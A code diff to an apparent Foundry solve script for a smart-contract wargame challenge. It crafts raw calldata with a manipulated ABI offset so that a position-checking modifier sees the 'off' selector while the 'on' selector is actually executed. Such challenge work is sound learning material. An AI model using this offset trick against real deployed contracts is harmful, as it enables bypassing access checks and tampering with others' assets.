@@ -24,8 +24,17 @@ contract Debug is Script, Test {
   }
 
   fallback() external {
-    emit log_named_bytes("Data[68:]", msg.data[68:]);
+    emit log_named_bytes("Data[0:4]", msg.data[0:4]);
+    emit log_named_bytes("Data[4:36]", msg.data[4:36]);
+    emit log_named_bytes("Data[36:68]", msg.data[36:68]);
+    emit log_named_bytes("Data[68:100]", msg.data[68:100]);
+    emit log_named_bytes("Data[100:132]", msg.data[100:132]);
+    emit log_named_bytes("Data[132:]", msg.data[132:]);
   }
+
+  // function flipSwitch(bytes memory _data) external {
+  //   console2.log("I am called");
+  // }
 }
 
 contract Solve is Script, Test {
@@ -40,8 +49,21 @@ contract Solve is Script, Test {
     emit log_named_bytes("Off selector", abi.encodePacked(offSelector));
     emit log_named_bytes("On selector", abi.encodePacked(onSelector));
 
-    bytes memory callPayload = abi.encodeWithSignature("flipSwitch(bytes)", abi.encodePacked(offSelector));
-    bytes memory finalPayload = abi.encodePacked(callPayload, offSelector);
+    // bytes memory callPayload = abi.encodeWithSignature("flipSwitch(bytes)", abi.encodePacked(offSelector));
+    // 4 bytes selector
+    // 32 bytes offset -> 96
+    // 32 bytes random
+    // 32 bytes garbage -> turnSwitchOff
+    // 32 bytes length -> 4
+    // 32 bytes data - turnSwitchOn
+    bytes memory callPayload = abi.encodePacked(
+      bytes4(keccak256("flipSwitch(bytes)")),
+      bytes32(uint256(96)),
+      bytes32(0),
+      bytes32(offSelector),
+      bytes32(uint256(4)),
+      bytes32(onSelector)
+    );
     console.log("Payload length: %s", callPayload.length);
     emit log_named_bytes("Payload", callPayload);
     // bytes memory slice64 = callPayload[64:];
@@ -49,11 +71,11 @@ contract Solve is Script, Test {
 
     (bool success, bytes memory data) = target.call(callPayload);
     emit log_named_bytes("Data returned", data);
-    // require(success, "Call failed");
-    // require(ITarget(target).switchOn(), "Switch is off");
+    require(success, "Call failed");
+    require(ITarget(target).switchOn(), "Switch is off");
 
-    Debug debug = new Debug();
-    address(debug).call(callPayload);
+    // Debug debug = new Debug();
+    // address(debug).call(callPayload);
 
     vm.stopBroadcast();
   }
